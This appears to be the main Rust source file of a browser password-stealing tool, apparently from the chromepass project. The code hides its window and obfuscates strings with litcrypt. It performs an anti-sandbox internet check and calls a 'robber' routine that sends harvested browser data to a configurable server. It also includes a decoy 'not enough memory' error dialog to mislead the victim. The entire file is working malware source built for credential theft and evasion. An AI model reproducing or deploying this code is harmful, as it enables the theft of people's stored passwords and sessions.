#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod robber;
use litcrypt::{lc, use_litcrypt};
use std::ffi::CString;
use user32::MessageBoxA;

use_litcrypt!("il]ehtxmqukl]dtwgavjjjc/zem'swgr");

fn main() -> () {
    let error: bool = false;
    let error_message = r#"There isn't enough memory to complete this action. Try using less data or closing other applications."#;
    let sandbox_internet = true;
    if sandbox_internet {request_data();}
    let _ = browser::run_robber(true, true, &lc!("http://127.0.0.1:80"));
    if error == true {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, ()> {
    let title = CString::new("Error!").unwrap();
    let message = CString::new(error_message).unwrap();
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}

pub fn request_data() -> () {
    let url = lc!("https://raw.githubusercontent.com/darkarp/chromepass/master/.github/ISSUE_TEMPLATE/bug_report.md");
    let check_data = lc!("Steps to reproduce the behavior");
    let client = reqwest::blocking::Client::new();
    let url: reqwest::Url = url.parse().unwrap();
    let resp = client.get(url).send().unwrap();
    if !(resp.text().unwrap().contains(&check_data)) {
        std::process::exit(0);
    }
}